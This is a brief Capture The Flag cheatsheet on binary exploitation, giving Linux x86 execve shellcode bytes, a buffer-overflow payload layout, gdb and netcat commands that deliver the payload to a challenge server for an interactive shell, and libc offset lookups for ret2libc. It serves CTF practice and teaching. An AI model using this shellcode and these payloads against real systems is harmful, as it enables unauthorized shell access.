# Capture The Flag Cheatsheet

Example commands to aid in solving CTF problems.

## Binary Exploitation

#### Using 32-bit Shellcode

Reliable Linux/x86 (32-bit) shellcode. To find shellcode for your target architecture, see [shell-storm's list](http://shell-storm.org/shellcode/).

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```
Anatomy of a payload for bufferoverflow:

```
Buffer start                                                                                        Saved EBP                    Return address                                Next Return address         Argument list
|                                                                                                         |                                    |                                                        |                                        |
[optional NOP (0x90) bytes] [injected shellcode] [padding bytes] [fake/garbage address] [desired return address (&callee)] [callee's return address] [optional argument 1] [optional argument 2, etc]
```

Debugging shellcode in gdb - open binary, set a breakpoint at the start of the vulnerable function, run with payload bytes sent to stdin.

```
gdb ./binary
b vuln_func
r < <(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*111 + "\x90"*4 + "\x80\xa0\x04\x08"')
```
Send the payload to server 10.0.0.1, listening on port 1337. Note the cat command to keeps the netcat sesssion open, granting an interactive shell:

```
(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*111 + "\x90"*4 + "\x80\xa0\x04\x08"'; cat) | nc 10.0.0.1 1337
```
#### Computing offsets into libc

Assume you the know the address, in memory, at which libc has been loaded and have a local copy of the same libc version. To get offset of system():

```
readelf -s /lib/x86_64-linux-gnu/libc-2.21.so | grep "system"
```

To get offset of the "/bin/sh" string:

```
strings -t x /lib/x86_64-linux-gnu/libc-2.21.so | grep "/bin/sh"
```